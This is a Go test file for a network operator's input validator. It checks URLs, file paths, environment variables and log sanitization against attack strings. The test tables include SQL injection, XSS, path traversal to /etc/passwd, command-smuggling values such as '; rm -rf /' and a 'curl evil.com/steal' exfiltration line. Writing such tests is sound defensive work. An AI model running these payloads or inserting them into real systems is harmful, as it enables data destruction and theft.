package security

import (
	"fmt"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/thc1006/nephoran-intent-operator/planner/internal/rules"
)

// TestKMPDataValidation_EdgeCases tests edge cases and boundary conditions for KMP data validation
func TestKMPDataValidation_EdgeCases(t *testing.T) {
	validator := NewValidator(DefaultValidationConfig())

	tests := []struct {
		name      string
		data      rules.KPMData
		wantError bool
		errorMsg  string
	}{
		{
			name: "boundary values - minimum valid",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "a",
				PRBUtilization:  0.0,
				P95Latency:      0.0,
				ActiveUEs:       0,
				CurrentReplicas: 0,
			},
			wantError: false,
		},
		{
			name: "boundary values - maximum valid",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          strings.Repeat("a", 255),
				PRBUtilization:  1.0,
				P95Latency:      10000.0,
				ActiveUEs:       10000,
				CurrentReplicas: 100,
			},
			wantError: false,
		},
		{
			name: "unicode node ID - valid characters",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "node-αβγ-001", // Contains unicode but should fail due to regex
				PRBUtilization:  0.5,
				P95Latency:      100.0,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "alphanumeric",
		},
		{
			name: "very long node ID",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          strings.Repeat("a", 256),
				PRBUtilization:  0.5,
				P95Latency:      100.0,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "too long",
		},
		{
			name: "precision edge case - PRB utilization",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "test-node",
				PRBUtilization:  1.0000000001, // Slightly over 1.0
				P95Latency:      100.0,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "exceeds maximum",
		},
		{
			name: "very high latency",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "test-node",
				PRBUtilization:  0.5,
				P95Latency:      99999.9,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "exceeds maximum",
		},
		{
			name: "node ID with control characters",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "test\x00node\x01",
				PRBUtilization:  0.5,
				P95Latency:      100.0,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "alphanumeric",
		},
		{
			name: "node ID with emoji",
			data: rules.KPMData{
				Timestamp:       time.Now(),
				NodeID:          "node-🚀-001",
				PRBUtilization:  0.5,
				P95Latency:      100.0,
				ActiveUEs:       50,
				CurrentReplicas: 2,
			},
			wantError: true,
			errorMsg:  "alphanumeric",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateKMPData(tt.data)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateKMPData() error = %v, wantError %v", err, tt.wantError)
				return
			}

			if tt.wantError && err != nil && tt.errorMsg != "" {
				if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error message to contain '%s', got: %v", tt.errorMsg, err)
				}
			}
		})
	}
}

// TestURLValidation_SecurityThreatScenarios tests URL validation against various security threats
func TestURLValidation_SecurityThreatScenarios(t *testing.T) {
	validator := NewValidator(DefaultValidationConfig())

	threatScenarios := []struct {
		name        string
		url         string
		expectError bool
		threatType  string
	}{
		{
			name:        "SSRF - internal network access",
			url:         "http://127.0.0.1:22/ssh",
			expectError: false, // URL structure is valid, SSRF prevention is application-level
			threatType:  "SSRF",
		},
		{
			name:        "SSRF - localhost alternative",
			url:         "http://localhost:3306/mysql",
			expectError: false, // Structure valid, need additional controls
			threatType:  "SSRF",
		},
		{
			name:        "Protocol confusion - javascript",
			url:         "javascript:alert('xss')",
			expectError: true,
			threatType:  "Protocol confusion",
		},
		{
			name:        "Protocol confusion - data URI",
			url:         "data:text/html,<script>alert('xss')</script>",
			expectError: true,
			threatType:  "Protocol confusion",
		},
		{
			name:        "Protocol confusion - file",
			url:         "file:///etc/passwd",
			expectError: true,
			threatType:  "Protocol confusion",
		},
		{
			name:        "URL injection - query manipulation",
			url:         "http://api.example.com/data?param=value'; DROP TABLE users; --",
			expectError: true,
			threatType:  "SQL injection via URL",
		},
		{
			name:        "URL injection - fragment manipulation",
			url:         "http://api.example.com/data#'; DELETE FROM metrics; --",
			expectError: false, // Fragments don't typically cause server-side issues
			threatType:  "Fragment injection",
		},
		{
			name:        "Buffer overflow - very long URL",
			url:         "http://example.com/" + strings.Repeat("a", 5000),
			expectError: true,
			threatType:  "Buffer overflow",
		},
		{
			name:        "Unicode normalization attack",
			url:         "http://exаmple.com/api", // Contains Cyrillic 'а' instead of 'a'
			expectError: false, // URL parsing handles this, but domain validation might catch it
			threatType:  "Unicode attack",
		},
		{
			name:        "Double encoding attack",
			url:         "http://example.com/api?param=%2527%252520DROP",
			expectError: false, // URL encoding is valid, application must handle decoding safely
			threatType:  "Double encoding",
		},
		{
			name:        "Path traversal in URL path",
			url:         "http://example.com/../../../etc/passwd",
			expectError: false, // Path traversal prevention is typically server-side
			threatType:  "Path traversal",
		},
		{
			name:        "Null byte injection",
			url:         "http://example.com/api\x00/admin",
			expectError: false, // Go's URL parser handles null bytes gracefully
			threatType:  "Null byte injection",
		},
		{
			name:        "CRLF injection",
			url:         "http://example.com/api\r\nSet-Cookie: admin=true",
			expectError: false, // URL structure is valid, CRLF prevention is HTTP-level
			threatType:  "CRLF injection",
		},
		{
			name:        "International domain - punycode",
			url:         "http://xn--e1afmkfd.xn--p1ai/api",
			expectError: false,
			threatType:  "Punycode confusion",
		},
	}

	for _, scenario := range threatScenarios {
		t.Run(scenario.name, func(t *testing.T) {
			err := validator.ValidateURL(scenario.url, fmt.Sprintf("threat test: %s", scenario.threatType))
			if (err != nil) != scenario.expectError {
				t.Errorf("URL validation for %s threat: error = %v, expectError = %v", 
					scenario.threatType, err, scenario.expectError)
			}
			
			if scenario.expectError && err != nil {
				t.Logf("Successfully blocked %s threat: %v", scenario.threatType, err)
			} else if !scenario.expectError {
				t.Logf("URL passed validation (may require additional controls): %s", scenario.url)
			}
		})
	}
}

// TestFilePathValidation_SecurityVulnerabilities tests file path validation against security vulnerabilities
func TestFilePathValidation_SecurityVulnerabilities(t *testing.T) {
	validator := NewValidator(DefaultValidationConfig())

	vulnerabilityTests := []struct {
		name         string
		path         string
		expectError  bool
		vulnerability string
	}{
		{
			name:         "Directory traversal - basic",
			path:         "../../../etc/passwd",
			expectError:  true,
			vulnerability: "Directory traversal",
		},
		{
			name:         "Directory traversal - encoded",
			path:         "..%2F..%2F..%2Fetc%2Fpasswd",
			expectError:  false, // URL decoding not handled at validation level
			vulnerability: "Encoded directory traversal",
		},
		{
			name:         "Directory traversal - double encoded",
			path:         "..%252F..%252F..%252Fetc%252Fpasswd",
			expectError:  false,
			vulnerability: "Double encoded directory traversal",
		},
		{
			name:         "Directory traversal - Windows",
			path:         "..\\..\\..\\windows\\system32\\config\\sam",
			expectError:  true,
			vulnerability: "Windows directory traversal",
		},
		{
			name:         "Directory traversal - mixed separators",
			path:         "../..\\../etc/passwd",
			expectError:  true,
			vulnerability: "Mixed separator traversal",
		},
		{
			name:         "Null byte truncation",
			path:         "/tmp/safe.txt\x00../../etc/passwd",
			expectError:  true,
			vulnerability: "Null byte truncation",
		},
		{
			name:         "Unicode normalization - different representations",
			path:         "/tmp/test\u2044file.txt", // Unicode fraction slash
			expectError:  false,
			vulnerability: "Unicode normalization",
		},
		{
			name:         "Path with embedded commands",
			path:         "/tmp/file.txt; rm -rf /",
			expectError:  true,
			vulnerability: "Command injection via filename",
		},
		{
			name:         "Path with spaces and quotes",
			path:         "/tmp/\"malicious file\".txt",
			expectError:  true,
			vulnerability: "Quote injection",
		},
		{
			name:         "Very deep directory structure",
			path:         strings.Repeat("a/", 1000) + "file.txt",
			expectError:  true,
			vulnerability: "Path length DoS",
		},
		{
			name:         "Hidden file access",
			path:         "/home/user/.ssh/id_rsa",
			expectError:  false, // Hidden files are valid, access control is separate
			vulnerability: "Hidden file access",
		},
		{
			name:         "Device file access - Unix",
			path:         "/dev/null",
			expectError:  true,
			vulnerability: "Device file access",
		},
		{
			name:         "Proc filesystem access",
			path:         "/proc/self/environ",
			expectError:  true,
			vulnerability: "Process information disclosure",
		},
		{
			name:         "Windows device name",
			path:         "CON.txt",
			expectError:  false, // Device name validation is Windows-specific
			vulnerability: "Windows device name",
		},
		{
			name:         "UNC path - Windows",
			path:         "\\\\server\\share\\file.txt",
			expectError:  false, // UNC paths are valid on Windows
			vulnerability: "UNC path access",
		},
	}

	for _, test := range vulnerabilityTests {
		t.Run(test.name, func(t *testing.T) {
			err := validator.ValidateFilePath(test.path, fmt.Sprintf("vulnerability test: %s", test.vulnerability))
			if (err != nil) != test.expectError {
				t.Errorf("Path validation for %s: error = %v, expectError = %v", 
					test.vulnerability, err, test.expectError)
			}
			
			if test.expectError && err != nil {
				t.Logf("Successfully blocked %s vulnerability: %v", test.vulnerability, err)
			}
		})
	}
}

// TestEnvironmentVariableValidation_InjectionPrevention tests environment variable validation for injection prevention
func TestEnvironmentVariableValidation_InjectionPrevention(t *testing.T) {
	validator := NewValidator(DefaultValidationConfig())

	injectionTests := []struct {
		name      string
		envName   string
		value     string
		expectErr bool
		attack    string
	}{
		{
			name:      "Command injection in URL",
			envName:   "PLANNER_METRICS_URL",
			value:     "http://example.com/api; curl evil.com/steal",
			expectErr: false, // Semicolon is valid in URLs (query params)
			attack:    "Command injection",
		},
		{
			name:      "SQL injection in URL",
			envName:   "PLANNER_METRICS_URL",
			value:     "http://example.com/api?id=1'; DROP TABLE users; --",
			expectErr: true,
			attack:    "SQL injection",
		},
		{
			name:      "Script injection in URL",
			envName:   "PLANNER_METRICS_URL",
			value:     "http://example.com/api?callback=<script>alert('xss')</script>",
			expectErr: true,
			attack:    "Script injection",
		},
		{
			name:      "Directory traversal in DIR",
			envName:   "PLANNER_OUTPUT_DIR",
			value:     "../../../etc",
			expectErr: true,
			attack:    "Directory traversal",
		},
		{
			name:      "Command injection in DIR",
			envName:   "PLANNER_CONFIG_DIR",
			value:     "/tmp; rm -rf /",
			expectErr: false, // Semicolon is valid in paths
			attack:    "Command injection",
		},
		{
			name:      "Null byte injection",
			envName:   "PLANNER_SETTING",
			value:     "safe_value\x00malicious_value",
			expectErr: true,
			attack:    "Null byte injection",
		},
		{
			name:      "CRLF injection",
			envName:   "PLANNER_SETTING",
			value:     "safe_value\r\nmalicious: true",
			expectErr: true,
			attack:    "CRLF injection",
		},
		{
			name:      "Unicode control characters",
			envName:   "PLANNER_SETTING",
			value:     "value\u202E override\u202D", // Right-to-left override characters
			expectErr: false, // Unicode text is generally valid
			attack:    "Unicode control",
		},
		{
			name:      "Buffer overflow simulation",
			envName:   "PLANNER_SETTING",
			value:     strings.Repeat("A", 10000),
			expectErr: false, // Large values are valid unless specifically limited
			attack:    "Buffer overflow",
		},
		{
			name:      "Empty environment variable name",
			envName:   "",
			value:     "some_value",
			expectErr: true,
			attack:    "Empty name injection",
		},
		{
			name:      "Environment variable with special chars in name",
			envName:   "PLANNER_CONFIG'; DROP TABLE config; --",
			value:     "/tmp/config",
			expectErr: false, // Env var names with special chars are technically valid
			attack:    "Name injection",
		},
	}

	for _, test := range injectionTests {
		t.Run(test.name, func(t *testing.T) {
			err := validator.ValidateEnvironmentVariable(test.envName, test.value, fmt.Sprintf("injection test: %s", test.attack))
			if (err != nil) != test.expectErr {
				t.Errorf("Environment variable validation for %s attack: error = %v, expectErr = %v", 
					test.attack, err, test.expectErr)
			}
			
			if test.expectErr && err != nil {
				t.Logf("Successfully blocked %s attack: %v", test.attack, err)
			}
		})
	}
}

// TestDataSanitization_LogInjectionPrevention tests log sanitization functionality
func TestDataSanitization_LogInjectionPrevention(t *testing.T) {
	validator := NewValidator(DefaultValidationConfig())

	sanitizationTests := []struct {
		name      string
		input     string
		expected  string
		attack    string
	}{
		{
			name:     "Log injection with newlines",
			input:    "user_input\nADMIN LOGIN: admin/admin",
			expected: "user_input\\nADMIN LOGIN: admin/admin",
			attack:   "Log injection",
		},
		{
			name:     "Log forging with CRLF",
			input:    "normal_log\r\nERROR: Fake error message",
			expected: "normal_log\\r\\nERROR: Fake error message",
			attack:   "Log forging",
		},
		{
			name:     "ANSI escape sequence injection",
			input:    "text\x1b[31mRED TEXT\x1b[0m",
			expected: "text\x1b[31mRED TEXT\x1b[0m", // ANSI sequences not sanitized by default
			attack:   "ANSI injection",
		},
		{
			name:     "Tab injection for log structure manipulation",
			input:    "field1\tfield2\tfield3",
			expected: "field1\\tfield2\\tfield3",
			attack:   "Tab injection",
		},
		{
			name:     "Very long string for log flooding",
			input:    strings.Repeat("A", 1000),
			expected: strings.Repeat("A", 253) + "...",
			attack:   "Log flooding",
		},
		{
			name:     "Mixed control characters",
			input:    "normal\n\r\t\x00\x08text",
			expected: "normal\\n\\r\\ttext", // Null and backspace should be removed
			attack:   "Mixed control chars",
		},
		{
			name:     "Unicode line separators",
			input:    "line1\u2028line2\u2029line3",
			expected: "line1\u2028line2\u2029line3", // Unicode line separators not handled
			attack:   "Unicode line separators",
		},
	}

	for _, test := range sanitizationTests {
		t.Run(test.name, func(t *testing.T) {
			result := validator.SanitizeForLogging(test.input)
			if result != test.expected {
				t.Errorf("Sanitization for %s attack failed.\nInput:    %q\nExpected: %q\nGot:      %q", 
					test.attack, test.input, test.expected, result)
			} else {
				t.Logf("Successfully sanitized %s attack", test.attack)
			}
		})
	}
}

// TestValidationConfig_SecurityDefaults tests that default configuration values are secure
func TestValidationConfig_SecurityDefaults(t *testing.T) {
	config := DefaultValidationConfig()

	// Test that default limits are reasonable and secure
	securityChecks := []struct {
		name      string
		condition bool
		message   string
	}{
		{
			name:      "PRB utilization max limit",
			condition: config.MaxPRBUtilization <= 1.0 && config.MaxPRBUtilization > 0,
			message:   "PRB utilization should be between 0 and 1",
		},
		{
			name:      "Latency max limit reasonable",
			condition: config.MaxLatency > 0 && config.MaxLatency <= 60000, // 1 minute max
			message:   "Latency limit should be positive and reasonable",
		},
		{
			name:      "Replica count limits",
			condition: config.MaxReplicas > 0 && config.MaxReplicas <= 1000,
			message:   "Replica limits should be positive and reasonable",
		},
		{
			name:      "UE count limits",
			condition: config.MaxActiveUEs > 0 && config.MaxActiveUEs <= 1000000,
			message:   "UE count limits should be positive and reasonable",
		},
		{
			name:      "Path length limits",
			condition: config.MaxPathLength > 0 && config.MaxPathLength <= 65536,
			message:   "Path length should be positive and reasonable",
		},
		{
			name:      "URL length limits",
			condition: config.MaxURLLength > 0 && config.MaxURLLength <= 65536,
			message:   "URL length should be positive and reasonable",
		},
		{
			name:      "Only secure URL schemes allowed",
			condition: len(config.AllowedSchemes) > 0 && containsOnly(config.AllowedSchemes, []string{"http", "https"}),
			message:   "Only HTTP/HTTPS schemes should be allowed by default",
		},
		{
			name:      "Safe file extensions only",
			condition: len(config.AllowedExtensions) > 0 && containsOnly(config.AllowedExtensions, []string{".json", ".yaml", ".yml"}),
			message:   "Only safe data file extensions should be allowed",
		},
	}

	for _, check := range securityChecks {
		t.Run(check.name, func(t *testing.T) {
			if !check.condition {
				t.Errorf("Security check failed: %s", check.message)
			}
		})
	}
}

// containsOnly checks if slice1 contains only elements from slice2
func containsOnly(slice1, slice2 []string) bool {
	for _, item1 := range slice1 {
		found := false
		for _, item2 := range slice2 {
			if item1 == item2 {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	return true
}

// TestInputValidation_FuzzTesting performs basic fuzz testing on validation functions
func TestInputValidation_FuzzTesting(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping fuzz testing in short mode")
	}

	validator := NewValidator(DefaultValidationConfig())

	// Generate various malformed inputs for fuzz testing
	fuzzInputs := []string{
		"", // Empty
		"\x00", // Null byte
		strings.Repeat("A", 10000), // Very long
		"\xff\xfe\xfd", // Invalid UTF-8
		"normal\ntext\rwith\tcontrol\x08chars",
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"\\\\?\\C:\\Windows\\System32\\config\\SAM",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		strings.Map(func(r rune) rune {
			if unicode.IsControl(r) {
				return r
			}
			return 'A'
		}, string(make([]rune, 256))),
	}

	// Test URL validation with fuzz inputs
	t.Run("URL_Fuzz", func(t *testing.T) {
		for i, input := range fuzzInputs {
			t.Run(fmt.Sprintf("fuzz_%d", i), func(t *testing.T) {
				// Should not panic
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("URL validation panicked with input %q: %v", input, r)
					}
				}()
				
				err := validator.ValidateURL(input, "fuzz test")
				// We don't care about the result, just that it doesn't crash
				_ = err
			})
		}
	})

	// Test file path validation with fuzz inputs
	t.Run("FilePath_Fuzz", func(t *testing.T) {
		for i, input := range fuzzInputs {
			t.Run(fmt.Sprintf("fuzz_%d", i), func(t *testing.T) {
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("File path validation panicked with input %q: %v", input, r)
					}
				}()
				
				err := validator.ValidateFilePath(input, "fuzz test")
				_ = err
			})
		}
	})

	// Test environment variable validation with fuzz inputs
	t.Run("EnvVar_Fuzz", func(t *testing.T) {
		for i, input := range fuzzInputs {
			t.Run(fmt.Sprintf("fuzz_%d", i), func(t *testing.T) {
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("Environment variable validation panicked with input %q: %v", input, r)
					}
				}()
				
				err := validator.ValidateEnvironmentVariable("TEST_VAR", input, "fuzz test")
				_ = err
			})
		}
	})

	// Test log sanitization with fuzz inputs
	t.Run("LogSanitization_Fuzz", func(t *testing.T) {
		for i, input := range fuzzInputs {
			t.Run(fmt.Sprintf("fuzz_%d", i), func(t *testing.T) {
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("Log sanitization panicked with input %q: %v", input, r)
					}
				}()
				
				result := validator.SanitizeForLogging(input)
				
				// Verify result doesn't contain dangerous characters
				if strings.ContainsAny(result, "\n\r") && !strings.ContainsAny(result, "\\n\\r") {
					t.Errorf("Sanitization failed to escape newlines in input %q: %q", input, result)
				}
			})
		}
	})
}

// BenchmarkInputValidation_Performance benchmarks the performance of validation functions
func BenchmarkInputValidation_Performance(b *testing.B) {
	validator := NewValidator(DefaultValidationConfig())

	b.Run("ValidateKMPData", func(b *testing.B) {
		data := rules.KPMData{
			Timestamp:       time.Now(),
			NodeID:          "test-node-001",
			PRBUtilization:  0.75,
			P95Latency:      150.0,
			ActiveUEs:       100,
			CurrentReplicas: 3,
		}
		
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			_ = validator.ValidateKMPData(data)
		}
	})

	b.Run("ValidateURL", func(b *testing.B) {
		url := "https://api.example.com/v1/metrics?format=json"
		
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			_ = validator.ValidateURL(url, "benchmark")
		}
	})

	b.Run("ValidateFilePath", func(b *testing.B) {
		path := "/tmp/planner/intent-12345.json"
		
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			_ = validator.ValidateFilePath(path, "benchmark")
		}
	})

	b.Run("SanitizeForLogging", func(b *testing.B) {
		input := "user_input\nwith\rcontrol\tchars and normal text"
		
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			_ = validator.SanitizeForLogging(input)
		}
	})
}